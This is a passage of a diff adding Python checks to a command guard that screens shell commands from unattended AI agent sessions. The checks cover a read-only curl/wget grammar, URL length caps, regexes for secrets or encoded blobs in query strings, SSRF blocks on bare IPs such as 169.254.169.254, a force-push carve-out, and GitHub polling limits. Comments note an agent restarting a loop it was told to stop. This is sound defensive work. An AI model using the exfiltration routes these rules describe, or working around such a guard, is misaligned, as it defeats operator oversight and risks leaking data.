+                    globoff |= tool == "curl" and ch == "g"
+                    continue
+                if ch not in short_value:
+                    return f"{tool} -{ch} is not in the read-only fetch grammar"
+                value = cluster[k + 1:]
+                if not value:
+                    if i >= len(words):
+                        return f"{tool} -{ch} has no value"
+                    value = words[i]
+                    i += 1
+                opt = ch
+                break
+            if opt is None:
+                continue
+        if opt in ("o", "output", "O", "output-document"):
+            outputs.append(value)
+            wget_named = True
+        elif opt in ("X", "request"):
+            if value.upper() not in _READ_METHODS:
+                return f"{tool} method {value or '(none)'} is not a read"
+        elif opt == "url":
+            urls.append(value)
+        elif opt in ("w", "write-out"):
+            if "output" in value.lower():
+                return "curl --write-out %output writes a file"
+            if value.startswith("@"):
+                return "curl --write-out @file reads a local file into the output"
+        elif not _NUMERIC_VALUE.match(value):
+            return f"{tool} {opt} takes a number, not {value!r}"
+    if not urls:
+        return f"{tool} names no URL"
+    for url in urls:
+        why = _fetch_url_refusal(url)
+        if why:
+            return why
+    # A name taken from the URL (curl -O, wget without -O) is relative to a
+    # working directory the guard does not follow: refused outright.
+    if remote_name:
+        return (f"curl -O names the file from the URL; write with -o <absolute path under "
+                f"{FETCH_SCRATCH_ROOT}> instead")
+    if tool == "wget" and not wget_named and not spider:
+        return (f"wget without -O names the file itself; use -O - or -O <absolute path under "
+                f"{FETCH_SCRATCH_ROOT}>")
+    # curl expands {a,b} and [1-9] in a URL and substitutes the match for #N in
+    # -o, so a curl that writes a file must turn globbing off.
+    if tool == "curl" and not globoff and any(o not in _NO_FILE_OUTPUTS for o in outputs):
+        return "curl writing a file needs -g (--globoff) so URL globbing cannot rename the destination"
+    for path in outputs:
+        if path in _NO_FILE_OUTPUTS:
+            continue
+        why = _fetch_destination_refusal(path)
+        if why:
+            return f"{tool} {why}"
+    return None
+
+
+def _filter_refusal(exe, words):
+    """None when a downstream stage is a known pure filter used without a writing
+    or executing option; otherwise why it is refused."""
+    if exe not in _FETCH_FILTERS:
+        return f"{exe} is not a known read-only filter, so it could run or store what the fetch returns"
+    rule = _FETCH_FILTERS[exe]
+    if rule == "one-operand":
+        if len([a for a in words[1:] if not a.startswith("-") or a == "-"]) > 1:
+            return f"{exe} with a second operand writes a file"
+    elif rule is not None and any(rule.match(a) for a in words[1:]):
+        return f"{exe} option would write a file or run a program"
+    return None
+
+
+def read_only_fetch_refusal(cmd):
+    """None if `cmd` is a plain read-only fetch whose unlisted URLs all pass the
+    open-read policy; otherwise the reason it is not."""
+    if NET_CLIENT.search(cmd):
+        return "an interpreter network client is not a plain fetch"
+    if _UNREADABLE.search(cmd):
+        return "the command carries a $-expansion, backtick or process substitution the guard cannot read"
+    if REMOTE_TARGET_RE.search(cmd):
+        return "a remote copy target is a send"
+    try:
+        tokens = shell_tokens(cmd)
+    except ValueError:
+        return "the command could not be parsed"
+    # No directory change is followed, so none is allowed: in any position, in
+    # a subshell or brace group, behind builtin/command/eval or a quote.
+    for t in tokens:
+        for piece in re.split(r"[\s;&|(){}<>!]+", t):
+            if piece.lstrip("\\").lower() in _DIRECTORY_CHANGERS:
+                return (f"a fetch to an unlisted host may not change directory ({piece}); "
+                        f"name an absolute destination under {FETCH_SCRATCH_ROOT} instead")
+    segments, current = [], []
+    for t in tokens:
+        if t in SHELL_BOUNDARIES:
+            segments.append(current)
+            current = []
+        else:
+            current.append(t)
+    segments.append(current)
+    fetches = 0
+    for seg in segments:
+        words = [w for w in seg if w not in ("(", ")", "{", "}")]
+        assignments = []
+        while words and (_ASSIGNMENT.match(words[0]) or words[0] in _COMMAND_KEYWORDS):
+            if _ASSIGNMENT.match(words[0]):
+                assignments.append(words[0])
+            words = words[1:]
+        # No assignment anywhere in a fetch command, even alone in its own
+        # segment: SSLKEYLOGFILE= appends to any path and PATH=. runs a local curl.
+        if assignments:
+            return (f"a variable assignment ({assignments[0].split('=', 1)[0]}=) can change "
+                    f"how a fetch connects or where it writes")
+        try:
+            words, redirects = shell_operands(words)
+        except ValueError:
+            return "the command could not be parsed"
+        for path in redirects:
+            if path != "/dev/null":
+                return (f"a fetch to an unlisted host may redirect output only to /dev/null, "
+                        f"not {path!r}; write with curl -o / wget -O <absolute path under "
+                        f"{FETCH_SCRATCH_ROOT}>")
+        if not words:
+            continue
+        exe = os.path.basename(words[0]).lower()
+        if exe == "tee":
+            if len(words) > 1:
+                return "tee may not write a file in a fetch command; use curl -o / wget -O"
+            continue
+        if exe in COMMAND_WRAPPERS and _SENDER_NAMES.intersection(command_executables(words)):
+            return f"a network client run through {exe} is not a plain fetch"
+        if exe in _SENDER_NAMES:
+            if exe not in READ_ONLY_FETCHERS:
+                return f"{exe} is not a plain fetch"
+            if words[0] != exe:
+                return f"{exe} must be named as a bare word, not {words[0]}, so the program run is the one judged"
+            why = _fetch_grammar_refusal(exe, words[1:])
+            if why:
+                return why
+            fetches += 1
+            continue
+        why = _filter_refusal(exe, words)
+        if why:
+            return why
+    if not fetches:
+        return "no curl or wget fetch in command position"
+    for url in urls_in(cmd):
+        if host_allowlisted(url_host(url)):
+            continue
+        why = webfetch_open_read_reason(url)
+        if why:
+            return why.replace("WebFetch ", "the fetch ").split(" — blocked")[0]
+    return None
+
+
+# ── THE DERIVED HOST LIST (2026-08-09, the "B" half of Joe's "build A and B") ─
+#
+# KNOWN_HOSTS above is trust as CODE, which is right for infrastructure and wrong
+# for client practice websites: a different host per client, unknown until the
+# client exists, growing weekly. Encoding those in code means one hand-edit per
+# client forever, each one a session asking to widen a security allowlist.
+#
+# So the rest of the list is DATA, generated by ops/fetch-allowlist.py from the
+# email domains of CLIENTS AND LEADS already in the record — partner-entered at
+# intake, free-mail filtered. Read that file's header for the full reasoning,
+# including why it is email domains rather than a website column, and the honest
+# limit (this makes widening AUDITED, not impossible: a verb can write an email).
+#
+# FAILS OPEN TO THE NARROW LIST, never to a wider one: if the file is missing or
+# unreadable, the result is KNOWN_HOSTS alone. A generator that breaks tightens
+# the gate rather than loosening it, which is the correct direction for a
+# security control to fail.
+_DERIVED_CACHE = {"mtime": None, "hosts": ()}
+DERIVED_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+                            "out", "fetch-allowlist.txt")
+
+
+def derived_hosts():
+    """Hosts from the record-derived list. Cached on mtime; never raises."""
+    try:
+        mt = os.path.getmtime(DERIVED_PATH)
+    except OSError:
+        return ()
+    if _DERIVED_CACHE["mtime"] == mt:
+        return _DERIVED_CACHE["hosts"]
+    try:
+        with open(DERIVED_PATH, encoding="utf-8") as fh:
+            hosts = tuple(ln.strip().lower() for ln in fh
+                          if ln.strip() and not ln.lstrip().startswith("#"))
+    except Exception:
+        return ()
+    _DERIVED_CACHE.update(mtime=mt, hosts=hosts)
+    return hosts
+
+
+def host_allowlisted(host):
+    """True if host is on the code list OR the record-derived list."""
+    host = (host or "").strip().lower()
+    normalized = host.strip(".")
+    # The app host is a single allowed origin. DNS permits one terminal dot;
+    # retaining the raw host here rejects extra dots and subdomains.
+    if normalized == "app.doctorcre.com":
+        return host in ("app.doctorcre.com", "app.doctorcre.com.")
+    if normalized.endswith(".app.doctorcre.com"):
+        return False
+    host = normalized
+    if not host:
+        return False
+    for k in KNOWN_HOSTS:
+        if host == k or host.endswith("." + k):
+            return True
+    for k in derived_hosts():
+        if host == k or host.endswith("." + k):
+            return True
+    return False
+
+
+# ── THE WEBFETCH READ-ONLY CLASS (2026-08-09, Joe: "build A and B") ──────────
+#
+# THE ERROR THIS FIXES. Until now WebFetch and Bash `curl` shared ONE allowlist,
+# and that forced the list to be as tight as the riskiest caller. Their
+# exfiltration ceilings are not remotely comparable:
+#
+#     WebFetch   GET only · payload out = the URL string · no credentials ·
+#                cross-host redirects are RETURNED to the caller, not followed
+#                (observed live twice on 2026-08-07 against alabamainteractive)
+#     Bash curl  any method · any body · credentials · follows redirects
+#
+# The guard's own stated job (see the header, class 4) is the EXFILTRATION
+# guard. A GET whose entire outbound payload is a URL is a different risk from a
+# POST that can carry a database, so it gets a different policy. KNOWN_HOSTS
+# still governs every Bash command that SENDS; since 2026-10-07 a Bash curl/wget
+# that is a plain read-only fetch gets this same per-URL policy (see THE PLAIN
+# READ-ONLY FETCH above).
+#
+# WHAT THIS BUYS. Client verification needs the practice's own website, and
+# practice websites cannot be enumerated — there is a different one per client,
+# unknown until the client exists. An allowlist can never close that; a policy
+# can. This is what makes the weekly deal-history research slice able to read a
+# practice site at all.
+#
+# THE EXFILTRATION CONTROL IS THE LENGTH CAP, not the host list. If a GET can
+# only leave with what fits in its URL, then capping the URL caps the channel.
+# 256 chars total with a near-empty query admits ordinary pages and refuses a
+# payload. Everything else here is the SSRF floor.
+#
+# KNOWN LIMIT, STATED PLAINLY: a hostname that RESOLVES to a private address
+# (DNS rebinding) is not caught. Resolving in a PreToolUse hook would add a
+# network round-trip to every call and is itself resolver-dependent. The bare-IP
+# and private-suffix rules below stop the direct forms; rebinding is accepted
+# residual risk on a single-operator machine, and is logged here so the next
+# reader does not mistake its absence for an oversight.
+FETCH_MAX_URL = 256          # total characters
+FETCH_MAX_QUERY = 64         # characters after '?'
+
+_FETCH_HOST_DENY_SUFFIX = (
+    "localhost", "local", "internal", "localdomain", "home.arpa", "lan",
+)
+# Anything that looks like a secret riding in the query string.
+_FETCH_SECRETISH = re.compile(
+    r"(?i)\b(api[_-]?key|secret|token|password|passwd|credential|authorization|"
+    r"session[_-]?id|access[_-]?key)\b")
+# A long unbroken high-entropy run — a base64/hex blob being smuggled out.
+_FETCH_BLOB = re.compile(r"[A-Za-z0-9+/_=-]{40,}")
+
+
+def webfetch_open_read_reason(url):
+    """None if this GET is acceptable under the wider read-only class, else why not.
+
+    Only consulted for hosts NOT already in KNOWN_HOSTS — an allowlisted host
+    keeps its existing unconditional pass, so nothing that worked before breaks.
+    """
+    try:
+        parts = urlsplit(url if url.startswith(("http://", "https://")) else f"https://{url}")
+    except Exception as exc:                       # unparseable → refuse
+        return f"WebFetch URL could not be parsed ({type(exc).__name__}) — blocked by the CARR guard."
+
+    if len(url) > FETCH_MAX_URL:
+        return (f"WebFetch URL is {len(url)} chars (cap {FETCH_MAX_URL}) for a host outside "
+                f"KNOWN_HOSTS — blocked by the CARR guard. A long URL to an unvetted host is "
+                f"the exfiltration channel this cap exists to close.")
+    if len(parts.query) > FETCH_MAX_QUERY:
+        return (f"WebFetch query string is {len(parts.query)} chars (cap {FETCH_MAX_QUERY}) for a "
+                f"host outside KNOWN_HOSTS — blocked by the CARR guard.")
+    if parts.username or parts.password or "@" in parts.netloc:
+        return "WebFetch URL carries credentials in the authority — blocked by the CARR guard."
+    if _FETCH_SECRETISH.search(parts.query) or _FETCH_BLOB.search(parts.query):
+        return ("WebFetch query string looks like it carries a secret or an encoded blob — "
+                "blocked by the CARR guard.")
+
+    host = (parts.hostname or "").strip(".").lower()
+    if not host:
+        return "WebFetch URL has no host — blocked by the CARR guard."
+
+    try:
+        port = parts.port
+    except ValueError:
+        return "WebFetch URL has a malformed port — blocked by the CARR guard."
+    if port not in (None, 80, 443):
+        return (f"WebFetch to a non-standard port ({port}) on a host outside KNOWN_HOSTS — "
+                f"blocked by the CARR guard.")
+
+    # A bare IP literal skips DNS entirely and is how link-local metadata
+    # (169.254.169.254) and RFC1918 targets get reached. The wider class is for
+    # named public websites, so require a name.
+    try:
+        ip = ipaddress.ip_address(host)
+    except ValueError:
+        ip = None
+    if ip is not None:
+        return (f"WebFetch to a bare IP address ({host}) outside KNOWN_HOSTS — blocked by the "
+                f"CARR guard. The open read class requires a public DNS name.")
+
+    last = host.rsplit(".", 1)[-1]
+    if last in _FETCH_HOST_DENY_SUFFIX or host in _FETCH_HOST_DENY_SUFFIX:
+        return f"WebFetch to a non-public host ({host}) — blocked by the CARR guard."
+    if "." not in host:
+        return (f"WebFetch to a dotless host ({host}) — blocked by the CARR guard; that is a "
+                f"local name, not a public website.")
+    return None
+
+
+def log(msg):
+    """Timestamped and self-identifying. Before 2026-08-03 no hook stamped its
+    lines, so out/hook-guard.log could not answer "when did this fire" or even
+    "which gate wrote this" — 51 lines with test fixtures indistinguishable from
+    production denials. A log you cannot read chronologically is an artifact,
+    not a check."""
+    try:
+        os.makedirs(os.path.dirname(LOG), exist_ok=True)
+        ts = datetime.now(timezone.utc).astimezone().isoformat(timespec="seconds")
+        with open(LOG, "a") as fh:
+            fh.write(f"{ts} guard-unattended {msg.rstrip()}\n")
+    except Exception:
+        pass
+
+
+def in_safe_zone(cmd):
+    from cmd_text import shell_tokens, shell_operands, SHELL_BOUNDARIES
+    try:
+        tokens, _ = shell_operands(shell_tokens(cmd))
+    except ValueError:
+        return False
+    targets = []
+    segments, segment = [], []
+    for token in tokens + [';']:
+        if token in SHELL_BOUNDARIES:
+            if segment:
+                segments.append(segment)
+            segment = []
+        else:
+            segment.append(token)
+    for words in segments:
+        while words and (words[0] in {'sudo', 'command', 'env'} or re.match(r'^\w+=', words[0])):
+            words = words[1:]
+        if not words:
+            continue
+        executable = os.path.basename(words[0])
+        if executable in {'rm', 'srm'}:
+            targets.extend(token for token in words[1:] if not token.startswith('-'))
+        elif executable == 'find' and '-delete' in words:
+            if any(token in {'-exec', '-execdir', '-ok', '-okdir'} for token in words):
+                return False  # executable predicates cannot establish a safe cleanup
+            roots = []
+            for token in words[1:]:
+                if token.startswith('-') or token in {'(', '!', ')'}:
+                    break
+                roots.append(token)
+            if not roots:
+                return False  # find defaults to an unbound working directory
+            targets.extend(roots)
+    def safe_target(target):
+        if '$' in target or '`' in target or '..' in target.split('/'):
+            return False
+        parts = target.split("/")
+        for zone in SAFE_ZONES:
+            if zone.startswith("/"):
+                if target.startswith(zone):
+                    return True
+            else:
+                zone_parts = zone.rstrip("/").split("/")
+                if any(parts[i:i + len(zone_parts)] == zone_parts
+                       for i in range(len(parts))):
+                    return True
+        return False
+    return bool(targets) and all(safe_target(target) for target in targets)
+
+
+# ── Rebasing your own branch in place ────────────────────────────────────────
+#
+# WHY THIS CARVE-OUT EXISTS (measured 2026-08-15). The "force push" rule above is
+# blanket: it cannot see WHERE the push lands, so it refused a force-push at a
+# session's own feature branch exactly as hard as one aimed at main. main takes
+# roughly a hundred commits a day here, so a branch going stale mid-review is the
+# normal case — and the standard repair, `git rebase origin/main` then force-push
+# the SAME branch, was unavailable. The only route left was to abandon the branch,
+# cut a new one and open a second pull request.
+#
+# That is a corpse factory, and it is not a theory: four closed pull requests say
+# it in their own closing notes, in the same words — "reopened on a fresh branch
+# because rewriting the pushed one needs a force-push, which the unattended guard
+# blocks" (#125, #131, #142, #100). GitHub's auto-delete fires on MERGE and never
+# on close, so every one of those left a permanent orphan. 25 closed pull requests
+# and 35 dead branches were swept by hand on 2026-08-15. The guard was
+# manufacturing the mess, and no amount of sweeping addresses that.
+#
+# WHAT IS DELIBERATELY *NOT* WIDENED, because the point is to remove a
+# manufacturing defect rather than to hand back the whole capability:
+#
+#   main and master           — still refused. The server ruleset also forbids it,
+#                               and belt-and-braces is right for the one ref whose
+#                               history everything else is measured against.
+#   bare --force / -f         — still refused even at a feature branch. Lease is
+#                               the whole safety story: it aborts when the remote
+#                               moved under you, which is the only thing standing
+#                               between a rebase and a peer session's pushed work.
+#                               Bare force has no such check and many sessions
+#                               share this machine.
+#   +refspec                  — still refused; same overwrite, no lease.
+#   no named target           — still refused. Without an explicit ref the push
+#                               takes the current branch, which the guard cannot
+#                               see and which may be main. Naming it is the same
+#                               house rule as committing by named paths, and it
+#                               makes this decision auditable after the fact.
+PROTECTED_REFS = frozenset({"main", "master", "HEAD"})
+_LEASE = re.compile(r"--force-with-lease(?:=\S*)?\b", re.I)
+# `--force\b` also matches the "--force" inside "--force-with-lease", which is
+# what makes the blanket rule catch the lease form at all. Detecting the BARE
+# spelling therefore needs an explicit "not followed by -with-lease".
+_BARE_FORCE = re.compile(r"--force(?!-with-lease)\b|\s-f\b|\s\+\S+:", re.I)
+_GIT_PUSH = re.compile(r"git\s+push\b", re.I)
+# Where one command ends. `&&`, `||`, `;` and a bare `|` end it; a REDIRECTION
+# ends its argument list too, and must be recognised separately because `2>&1`
+# carries an ampersand that is not a separator — the exact thing that defeated
+# the previous version of this parser.
+_SEPARATOR = re.compile(r"^(?:&&|\|\||[;|&])$")
+_REDIRECT = re.compile(r"^\d*(?:>>?|<)&?\d*$|^[<>]")
+
+
+def force_push_to_named_side_branch(cmd):
+    """True only for the one safe shape: --force-with-lease at a named non-main ref.
+
+    Reads the EXECUTABLE remainder, not the raw command, so a feature-branch
+    example quoted in a pull-request body cannot vouch for a real force-push at
+    main sitting beside it in the same line.
+    """
+    text = strip_inert_text(cmd)
+    if len(_GIT_PUSH.findall(text)) != 1:
+        return False          # two pushes in one line: cannot reason, so refuse
+    if not _LEASE.search(text) or _BARE_FORCE.search(text):
+        return False
+    # ANCHOR ON THE REAL `git push`, NOT ON THE SUBSTRING "push".
+    #
+    # This read `text.split("push", 1)[1]` when the carve-out first shipped, and
+    # it was wrong in the shape every session actually sends. The guard receives
+    # the WHOLE command line, and a session working in a worktree always writes
+    # `cd <path> && git push …`. Any earlier "push" — in the directory, in the
+    # branch name — consumed the split, so the refspec parsed as nonsense and the
+    # push was refused. It failed on the very first real use: the branch was
+    # `force-push-narrow`, so its own worktree path contained "push".
+    match = _GIT_PUSH.search(text)
+    if not match:
+        return False
+    # READ TOKENS UNTIL THIS COMMAND ENDS, rather than cutting the string on raw
+    # separator CHARACTERS.
+    #
+    # The character cut was `re.split(r"[;|&]", …)`, and it broke on `2>&1` — the
+    # redirection every one of these commands carries in practice, whose ampersand
+    # is not a separator at all. It chopped mid-redirect, left a stray `2>` in the
+    # argument list, counted three words instead of two, and refused the push. The
+    # first two versions of this parser were each defeated by a piece of perfectly
+    # ordinary shell syntax the test cases had quietly excluded, so it now walks
+    # tokens and stops at a real boundary.
+    #
+    # Stopping at the boundary is what keeps this honest: only THIS command's
+    # arguments are read, so nothing chained after it can dress up its target.
+    words = []
+    # shlex separates an IO number from its operator (2, >&, 1). Remove only
+    # unquoted numbers adjacent to a redirect; `2 >` and `'2'>` are arguments.
+    remainder = re.sub(
+        r"'[^']*'|\"(?:\\.|[^\"\\])*\"|\\.|(?<!\S)\d+(?=[<>])",
+        lambda m: "" if m.group(0).isdigit() else m.group(0), text[match.end():])
+    try:
+        lexer = shlex.shlex(remainder, posix=True, punctuation_chars=";&|<>")
+        lexer.whitespace_split = True
+        tokens = list(lexer)
+    except ValueError:
+        return False
+    for token in tokens:
+        if _SEPARATOR.match(token) or _REDIRECT.match(token):
+            break             # this command's arguments end here
+        if token.startswith("-"):
+            continue          # a flag, not a destination
+        words.append(token)
+    if len(words) != 2:
+        return False          # no remote+ref pair means no visible destination
+    ref = words[1].split(":")[-1]
+    ref = re.sub(r"^refs/heads/", "", ref)
+    return bool(ref) and ref not in PROTECTED_REFS
+
+
+def raw_targets_carr(cmd):
+    """Recognize CARR path spellings without evaluating shell variables."""
+    if not isinstance(cmd, str):
+        return False
+    markers = (
+        r"(?:^|[^\w])~/carr-system(?:/|\b)",
+        r"\$(?:\{HOME\}|HOME)/carr-system(?:/|\b)",
+        r"/Users/[^/]+/carr-system(?:/|\b)",
+        r"(?:CloudStorage/GoogleDrive-[^/]+/)?My\\? Drive/CARR\\? AI(?:/|\b)",
+        r"/CARR\\? AI(?:/|\b)",
+    )
+    return any(re.search(marker, cmd) for marker in markers)
+
+
+
+
+def executed_invocations(cmd):
+    """Commands in shell positions, excluding quoted arguments and heredoc data."""
+    executable = strip_inert_text(cmd)
+    tokens = shell_tokens(executable)
+    segment = []
+    for token in tokens + [';']:
+        if token not in SHELL_BOUNDARIES:
+            segment.append(token)
+            continue
+        yield from command_invocations(_without_redirects(segment))
+        segment = []
+    # Single quotes are literal; substitutions in double quotes still execute.
+    expanding = re.sub(r"'[^']*'", '', executable)
+    for match in re.finditer(r'\$\(([^()]*)\)|`([^`]+)`', expanding):
+        yield from executed_invocations(match[1] or match[2])
+
+
+def _raw_github_api_dispatch(arguments):
+    if not arguments or arguments[0] != 'api':
+        return False
+    method, has_body, endpoint = None, False, False
+    words = iter(arguments[1:])
+    for word in words:
+        word = re.sub(r'^-[is]+(?=[XfF])', '-', word)
+        if word in {'-X', '--method'}:
+            method = next(words, '').upper()
+        elif word.startswith('--method='):
+            method = word.split('=', 1)[1].upper()
+        elif word.startswith('-X'):
+            method = word[2:].lstrip('=').upper()
+        elif word in _GH_API_BODY_FLAGS:
+            has_body = True
+            next(words, None)
+        elif any(word.startswith(flag + '=') for flag in _GH_API_BODY_FLAGS[2:]) or word.startswith(('-f', '-F')):
+            has_body = True
+        elif word in {'-H', '--header', '--hostname', '-p', '--preview', '-q', '--jq', '-t', '--template', '--cache'}:
+            next(words, None)
+        elif re.fullmatch(r'(?:https?://[^/]+/)?/?repos/[^/]+/[^/]+/(?:actions/workflows/[^/]+/)?dispatches/?(?:\?[^\s]*)?', word):
+            endpoint = True
+    return endpoint and (method == 'POST' if method is not None else has_body)
+
+
+def direct_metered_dispatch(cmd):
+    """Refuse paid dispatches that bypass their reviewed budget wrapper.
+
+    `./run.sh ci dispatch` admits main recovery in ops/ci-dispatch.py.
+    It needs no exemption here: only raw provider commands are refused.
+    The wrapper itself is not an escape flag.  The guard sees only the command
+    issued by the session; reviewed scripts perform their own in-process
+    admission before reaching the vendor.  Inert PR bodies and documentation
+    are stripped so describing a command is never mistaken for running it.
+    """
+    patterns = (
+        (re.compile(r"\b(?:npx\s+)?wrangler\s+(?:deploy|versions\s+(?:upload|deploy))\b", re.I),
+         "direct Cloudflare release bypasses the GitHub deployment workflow"),
+        (re.compile(r"\bneonctl\b[^\n;&|]*\bbranches\s+create\b", re.I),
+         "direct Neon branch create bypasses neon-disposable-branch admission"),
+        (re.compile(r"\bgh\s+workflow\s+run\b", re.I),
+         "direct GitHub Actions dispatch bypasses the remote-CI budget gate"),
+    )
+    # Match executable positions. Arguments to printf, grep, and a brief writer
+    # are data even when they contain an entire CLI command.
+    for program, arguments in executed_invocations(cmd):
+        if program == 'gh' and _raw_github_api_dispatch(arguments):
+            return 'direct GitHub API dispatch bypasses the remote-CI budget gate'
+        command = ' '.join([program, *arguments])
+        for pattern, reason in patterns:
+            if pattern.match(command):
+                return reason + " — blocked by the CARR metering gate"
+    return None
+
+
+# GitHub polling (Joe 2026-10-27: "fix it and stop it"). A dozen agents each
+# looping on `gh pr checks` / `gh run view` tripped the account-wide secondary
+# rate limit while the core quota sat near full, and an agent told to stop
+# restarted its loop minutes later. The orchestrator already receives CI
+# results as app events, so a repeated gh status read has no legitimate caller.
+#
+# What counts as repeating: the read sits in the condition or body of a
+# for/while/until loop, under `watch`, under `xargs -I` without the
+# placeholder, or carries `--watch`. A loop that reads each item of its own
+# list once (the read uses the loop variable) is a fan-out and is allowed
+# unless the loop also sleeps. A single read after a sleep is one call.
+# LIMIT, stated: this reads shell structure with a small scanner, not a full
+# parser; zsh `repeat`, functions defined then called in a loop, and loops in
+# script files the command launches are not seen.
+GITHUB_POLL_REASON = ("Polling GitHub trips the account-wide secondary rate limit. Make one "
+                      "gh call and report; the orchestrator receives CI results as app events.")
+_GH_STATUS_READS = {"pr": {"checks", "view", "list", "status"},
+                    "run": {"view", "list", "watch"}, "search": {"prs"}}
+_GH_API_BODY_FLAGS = ("-f", "-F", "--field", "--raw-field", "--input")
+_LOOP_KEYWORDS = frozenset({"for", "while", "until", "select"})
+_COMMAND_LEADS = frozenset({"then", "do", "else", "elif", "if", "while", "until", "!", "{",
+                            "}", "time"})
+_SHELL_OPERATORS = frozenset(";&|()\n")
+_INTERPRETER = re.compile(r"^(?:python[\d.]*|node|ruby|perl|deno|bun)$")
+_SCRIPT_LOOP = re.compile(r"\b(?:while|for)\b|setInterval")
+_SCRIPT_GITHUB = re.compile(r"""['"]gh['"]\s*,\s*['"](?:pr|run|api|search)['"]"""
+                            r"|\bgh\s+(?:pr|run|api|search)\b|api\.github\.com")
+_GH_ALIAS = re.compile(r"""(?:^|[\s;&|(])([A-Za-z_]\w*)=(["']?)(?:[^\s;&|'"]*/)?gh\2"""
+                       r"""(?=$|[\s;&|)])""")
+
+
+def _gh_status_read(args):
+    """True for a gh invocation that reads GitHub state (not a write)."""
+    if not args:
+        return False
+    if args[0] == "api":
+        if len(args) > 1 and args[1] == "graphql":
+            # GraphQL always sends a body; only a mutation writes.
+            return not re.search(r"\bmutation\b", " ".join(args[2:]))
+        method = None
+        for k, word in enumerate(args):
+            if word in ("-X", "--method") and k + 1 < len(args):
+                method = args[k + 1]
+            elif word.startswith("--method="):
+                method = word.split("=", 1)[1]
+            elif word.startswith("-X") and len(word) > 2:
+                method = word[2:]
+        if method is not None:
+            return method.upper() == "GET"
+        return not any(word.split("=")[0] in _GH_API_BODY_FLAGS for word in args)
+    return len(args) > 1 and args[1] in _GH_STATUS_READS.get(args[0], ())
+
+
+_GITHUB_API_URL = re.compile(r"(?:https?://)?api\.github\.com(?:[:/?#]|$)", re.I)
+
+
+def _github_read(program, args):
+    if program == "gh":
+        return _gh_status_read(args)
+    return program in READ_ONLY_FETCHERS | {"http", "https"} and any(
+        _GITHUB_API_URL.match(word.strip("'\"")) for word in args)
+
+
+def _bind_gh_aliases(text):
+    """Spell `$G pr checks` as `gh pr checks` when the command set G=gh."""
+    for name in {m[1] for m in _GH_ALIAS.finditer(text)}:
+        text = re.sub(r"\$(?:\{%s\}|%s(?!\w))" % (name, name), "gh", text)
+    return text
+
+
+def _shell_words(text):
+    """(word, start, end) for each word or operator character; quotes, $(...)
+    and backticks stay inside their word."""
+    words, i, n = [], 0, len(text)
+    while i < n:
+        if text[i] in " \t\r":
+            i += 1
+            continue
+        if text[i] in _SHELL_OPERATORS:
+            words.append((text[i], i, i + 1))
+            i += 1
+            continue
+        start, depth = i, 0
+        while i < n:
+            c = text[i]
+            if c == "\\":
+                i += 2
+            elif c in "'`":
+                close = text.find(c, i + 1)
+                i = n if close < 0 else close + 1
+            elif c == '"':
+                i += 1
+                while i < n and text[i] != '"':
+                    i += 2 if text[i] == "\\" else 1
+                i += 1
+            elif c == "$" and text[i + 1:i + 2] == "(":
+                depth += 1
+                i += 2
+            elif depth:
+                depth += {"(": 1, ")": -1}.get(c, 0)
+                i += 1
+            elif c in " \t\r" or c in _SHELL_OPERATORS:
+                break
+            else:
+                i += 1
+        words.append((text[start:i], start, i))
+    return words
+
+
+def _loops(text):
+    """(repeated text, loop variables) for each for/while/until/select loop."""
+    loops, stack, previous = [], [], None
+    for word, start, end in _shell_words(text):
+        command_position = (previous is None or previous in _SHELL_OPERATORS
+                            or previous in _COMMAND_LEADS)
+        if command_position and word in _LOOP_KEYWORDS:
+            stack.append([word, end, None, None])
+        elif command_position and word == "do" and stack and stack[-1][2] is None:
+            stack[-1][2:] = [start, end]
+        elif command_position and word == "done" and stack:
+            kind, header_start, header_end, body_start = stack.pop()
+            if body_start is not None:
+                header, body = text[header_start:header_end], text[body_start:start]
+                names = header.split()
+                if kind in ("for", "select"):
+                    candidates, repeated = names[:1], body
+                else:
+                    candidates = names[names.index("read") + 1:] if "read" in names else []
+                    repeated = header + "\n" + body
+                variables = [w for w in candidates if re.fullmatch(r"[A-Za-z_]\w*", w)]
+                loops.append((repeated, variables))
+        previous = word
+    return loops
+
+
+def _xargs_repeats_read(args):
+    """`xargs -I{} gh pr checks 1` runs the same read once per input line."""
+    for k, word in enumerate(args):
+        if _exe_name(word) == "gh":
+            gh_args, options = args[k + 1:], args[:k]
+            break
+    else:
+        return False
+    if not _gh_status_read(gh_args):
+        return False
+    placeholder = None
+    for k, word in enumerate(options):
+        if word in ("-I", "-J") and k + 1 < len(options):
+            placeholder = options[k + 1]
+        elif word.startswith(("-I", "-J")) and len(word) > 2:
+            placeholder = word[2:]
+        elif word in ("-i", "--replace"):
+            placeholder = "{}"
+        elif word.startswith("--replace="):
+            placeholder = word.split("=", 1)[1]
+    return placeholder is not None and not any(placeholder in w for w in gh_args)
+
+
+def _polls_github(text, depth=0):
+    invocations = list(executed_invocations(text))
+    for program, args in invocations:
+        if program == "gh" and _gh_status_read(args) and (
+                args[:2] == ["run", "watch"] or any(w.split("=")[0] == "--watch" for w in args)):
+            return True
+        if program == "watch" and any(
+                _github_read(p, a) for k in range(len(args))
+                for p, a in executed_invocations(" ".join(args[k:]))):
+            return True
+        if program == "xargs" and _xargs_repeats_read(args):
+            return True
+        if _INTERPRETER.match(program):
+            scripts = [args[k + 1] for k, w in enumerate(args[:-1]) if w in ("-c", "-e")]
+            if any(_SCRIPT_LOOP.search(s) and _SCRIPT_GITHUB.search(s) for s in scripts):
+                return True
+        if depth < 3 and (program == "eval" or _SHELLS.match(program)):
+            script = " ".join(args) if program == "eval" else _shell_c_script(args)
+            if script and _polls_github(_bind_gh_aliases(script), depth + 1):
+                return True
+    for repeated, variables in _loops(text):
+        found = list(executed_invocations(repeated))
+        sleeps = any(program == "sleep" for program, _ in found)
+        for program, args in found:
+            fan_out = any(re.search(r"\$\{?%s(?!\w)" % v, w) for v in variables for w in args)
+            if _github_read(program, args) and (sleeps or not fan_out):
+                return True
+    return False
+
+
+def github_poll_reason(cmd):
+    """Refuse a gh status read that the same command repeats."""
+    try:
+        polls = _polls_github(_bind_gh_aliases(strip_inert_text(cmd)))
+    except ValueError:
+        return None
+    return GITHUB_POLL_REASON if polls else None
+
+
+# bypass audit C53 / AGENTS.md:225, REDESIGNED (2026-09-24, Opus review). The
+# original version was a single regex over the whole `git add` argument list,
+# which denied `git add -A hooks/x.py` (a NAMED path alongside -A) exactly as
+# hard as a bare `git add -A` — a real false positive the replay against
+# 12,145 real commands caught. This version tokenizes the argument list and
+# denies ONLY the bare broad-add forms: `-A`, `--all`, a standalone `.`, the
+# `:/` pathspec-magic form (matches from the worktree root, same reach as
